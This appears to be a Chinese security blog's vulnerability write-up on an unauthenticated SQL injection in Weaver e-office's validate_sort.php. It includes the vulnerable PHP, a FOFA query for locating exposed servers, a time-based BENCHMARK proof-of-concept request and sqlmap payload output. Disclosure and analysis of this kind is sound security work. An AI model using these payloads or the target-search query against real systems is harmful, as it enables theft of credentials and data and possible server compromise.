---
title: "泛微e-office validate_sort.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-officeitem-sort-validate_sort-sqli.html
asset_dir: assets/泛微e-office-validate_sort.php-sql注入漏洞
---

# 泛微e-office validate\_sort.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/12 18:25
- 815浏览
- [0评论](#comment)
- 16分钟阅读

深入探索

在线安全工具

漏洞扫描服务

企业安全咨询

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office validate\_sort.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

文件大小转换

JSON处理工具

Windows安全工具

general/officeitem/sort/validate\_sort.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
$connection = openconnection( );
if ( $_REQUEST['sort_id'] != NULL )
{
    $query = "select SORT_ID from officeitem_sort where SORT='".$sort."' and SORT_ID !=".$_REQUEST['sort_id'];
}
else
{
    $query = "select SORT_ID from officeitem_sort where SORT='".$sort."'";
}
$cursor = exequery( $connection, $query );
if ( $row = mysql_fetch_row( $cursor ) )
{
    echo "1";
}
?>
```

深入探索

网络安全培训

编程语言教程

计算机安全

`sort_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/officeitem/sort/validate_sort.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: sort_id=1 AND 4225=BENCHMARK(5000000,MD5(0x4567684e))
```

[![泛微e-office validate_sort.php sql注入漏洞](images/img-001-32353a106474.webp)](https://image.mrxn.net/f2a4b28b5b67402ebe35c1cdc3766091.webp)

成功延时 5 秒

漏洞修复方案

深入探索

云安全解决方案

Nessus

服务器安全服务

[sqlmap](https://mrxn.net/tag/sqlmap "sqlmap") 结果如下

```
sqlmap identified the following injection point(s) with a total of 458 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://eoffice.mrxn.net:8082/general/officeitem/sort/validate_sort.php?sort_id=1 RLIKE (SELECT (CASE WHEN (5684=5684) THEN 1 ELSE 0x28 END))

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: http://eoffice.mrxn.net:8082/general/officeitem/sort/validate_sort.php?sort_id=1 AND 4225=BENCHMARK(5000000,MD5(0x4567684e))
---
```

validate\_number.php 也存在同样的问题。

- 标签：
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
